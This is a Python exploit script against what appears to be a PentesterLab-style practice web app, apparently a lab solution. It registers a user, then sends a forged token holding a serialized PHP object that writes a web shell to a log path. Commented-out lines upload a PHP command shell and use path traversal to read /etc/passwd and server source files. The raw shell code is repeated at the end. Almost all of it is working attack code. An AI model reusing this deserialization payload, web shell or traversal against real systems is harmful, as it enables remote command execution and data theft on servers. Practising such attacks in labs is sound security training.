#!/usr/bin/python

import requests
import json
url = "http://ptl-d829add2-a378f9b6.libcurl.so/"

def register(username, password):
	r = requests.post(url + '/register', json = {'username':username, 'password': password})
	token = json.loads(r.text)["token"]
	print token
	return token

def login(username, password):
	r = requests.post(url + '/login', json = {'username':username, 'password': password})
	token = json.loads(r.text)["token"]
	print token
	return token

def list_files(token):
	r = requests.post(url + '/files', json = {'token':token})
	# files = json.loads(r.text)["files"]
	# print files
	return r.text

def get_file(token, uuid, sig):
	r = requests.post(url + '/file', json = {'token':token, 'uuid':uuid, 'sig':sig})
	# files = json.loads(r.text)["files"]
	print r.text
	# return files

def upload(token, filename, content):
	r = requests.post(url + '/upload', json = {'token':token, 'filename':filename, 'content':content})
	# files = json.loads(r.text)["files"]
	print r.text
	# return files


def login_hacks(username, password, token):
	r = requests.post(url + '/login', json = {'username':username, 'password': password, 'token':token})
	token = json.loads(r.text)["token"]
	print token
	return token

register('bob2', 'bob')
# token = login('bob2', 'bob')

# upload(token, "test.php", """Hello!!
# <?php
#   system('ls');
#   system($_GET['cmd']);
# ?>
# """)
# get_file(token, "../.././.././././../etc/passwd", 0)
# doc = list_files(token)[0]
# for x in range(100):
# 	print x
# 	get_file(token, "../../../.././" + "./"*x + "./var/www/classes/utils.php", 0)
token = "Tzo0OiJGaWxlIjozOntzOjU6Im93bmVyIjtOO3M6NDoidXVpZCI7czo1MDoiSGVsbG8hISA8P3BocCBzeXN0ZW0oImxzIik7c3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4iO3M6NzoibG9nZmlsZSI7czoyMzoiL3Zhci93d3cvbG9ncy9zaGVsbC5waHAiO30%3D--8c923c6caee284cb69a5b26935787d6a"
login_hacks('bob2', 'bob', token)





<?php   system('ls');   system($_GET['cmd']); ?>









